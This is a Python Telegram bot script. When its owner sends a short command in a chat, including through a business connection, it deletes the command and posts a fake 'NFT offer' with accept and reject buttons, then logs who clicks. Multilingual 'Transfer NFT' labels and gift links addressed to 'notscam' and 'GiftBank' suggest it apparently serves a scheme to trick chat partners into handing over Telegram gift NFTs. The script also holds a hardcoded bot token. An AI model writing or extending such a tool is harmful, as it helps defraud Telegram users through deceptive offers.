import html
import json
import re
import sqlite3
import threading
import time
import telebot
from telebot import types
from telebot.apihelper import ApiTelegramException

TOKEN = "9217093222:AAGYb3Lu8L5ppSuHYehYYi4xvdFhMtGK5E0"
OWNERS = {6226038990}

DEFAULT_RATE_URL = "tg://send_gift?to=notscam"
DEFAULT_SPEC_URL = "tg://send_gift?to=GiftBank"

EMOJI_YES, EMOJI_NO = "5776375003280838798", "577637501825945508"
COIN = {"rate": "5954135079662916434", "unrate": "5954203112117366914"}
SOLD_EMOJI = "5773677501825945508"

labels = {
    "u": ("Принять", "Отклонить", "Передать NFT"),
    "i": ("Принять", "Відхилити", "Передати NFT"),
    "n": ("Accept", "Reject", "Transfer NFT"),
    "z": ("接受", "拒绝", "转让 NFT", "如何转让？"),
    "ar": ("قبول", "رفض", "تحويل NFT", "كيف تحويل？")
}

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# База данных
conn = sqlite3.connect("bot_database.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("""
    CREATE TABLE IF NOT EXISTS clicks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        action TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
""")
conn.commit()

def q(query, params=()):
    with sqlite3.connect("bot_database.db") as c:
        cursor = c.cursor()
        cursor.execute(query, params)
        c.commit()
        return cursor.fetchall()

def delete_msg(chat_id, message_id, bc=None):
    try:
        if bc:
            for m_fn in [lambda: bot.delete_business_messages(bc, chat_id, [message_id]), lambda: bot.delete_message(chat_id, message_id)]:
                try: 
                    m_fn()
                    break
                except: 
                    pass
        else:
            try: 
                bot.delete_message(chat_id, message_id)
            except: 
                pass
    except:
        pass

@bot.message_handler(commands=["start"])
def start(message):
    bot.reply_to(message, "Бот активен")

def process_ho(message, bc_id=None):
    if message.from_user.id not in OWNERS:
        return
    
    text = message.text or message.caption or ""
    parts = text.split(maxsplit=4)
    if len(parts) < 2:
        return
    
    link = parts[1]
    amount = parts[2] if len(parts) > 2 else "15"
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("Принять", callback_data="u:accept"),
        types.InlineKeyboardButton("Отклонить", callback_data="u:reject")
    )
    
    delete_msg(message.chat.id, message.message_id, bc_id)
    
    try:
        if bc_id:
            bot.send_message(
                message.chat.id,
                f"Оффер на NFT:\nСсылка: {link}\nСумма: {amount}",
                business_connection_id=bc_id,
                reply_markup=markup
            )
        else:
            bot.send_message(
                message.chat.id,
                f"Оффер на NFT:\nСсылка: {link}\nСумма: {amount}",
                reply_markup=markup
            )
    except Exception as e:
        print(f"Send error: {e}")

@bot.message_handler(func=lambda m: m.text and (m.text.startswith("/ho") or m.text.startswith("ho")))
def handle_ho_regular(message):
    process_ho(message, getattr(message, 'business_connection_id', None))

@bot.business_message_handler(func=lambda m: m.text and (m.text.startswith("/ho") or m.text.startswith("ho")))
def handle_ho_business(message):
    process_ho(message, getattr(message, 'business_connection_id', None))

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    data = call.data.split(":")
    if len(data) < 2:
        return
    action = data[0]
    choice = data[1]
    
    q("INSERT INTO clicks (user_id, action) VALUES (?, ?)", (call.from_user.id, f"{action}:{choice}"))
    
    try:
        bot.answer_callback_query(call.id, f"Вы выбрали: {choice}")
    except:
        pass
    
    try:
        if choice == "accept":
            bot.edit_message_text("Оффер принят ✅", call.message.chat.id, call.message.message_id)
        else:
            bot.edit_message_text("Оффер отклонен ❌", call.message.chat.id, call.message.message_id)
    except:
        pass

if __name__ == "__main__":
    print("Бот запущен локально")
    while True:
        try:
            bot.infinity_polling(skip_pending=True, timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)
